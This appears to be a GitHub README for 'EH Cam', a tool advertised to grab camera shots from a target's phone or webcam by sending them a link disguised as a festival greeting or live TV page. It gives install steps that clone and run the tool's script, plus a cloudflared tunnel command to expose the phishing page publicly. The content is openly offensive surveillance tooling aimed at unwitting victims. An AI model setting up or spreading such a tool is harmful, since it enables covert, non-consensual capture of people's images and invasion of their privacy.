# EH Cam
Grab cam shots from target's phone front camera or PC webcam just sending a link.
![cheese](Logo/Camera.png)

## Features
<ul>
  <li>Festival Wishing</li>
  <li>Live YouTube TV</li>
</ul>

## This Tool Tested On :
<ul>
  <li>Kali Linux</li>
  <li>Termux</li>
  <li>MacOS</li>
  <li>Ubuntu</li>
  <li>Perrot Sec OS</li>
</ul>

## Installing (Kali Linux/Termux):

```
apt update -y
apt upgrade -y
apt install  php -y
apt install openssh -y
apt install git -y
apt install wget -y
git clone https://github.com/Ehmunna/EH_CAM.git
cd EH_CAM
bash ehcam.sh
```
## Open new Session
```
apt install cloudflared
cloudflared tunnel --url http://localhost:3333
```
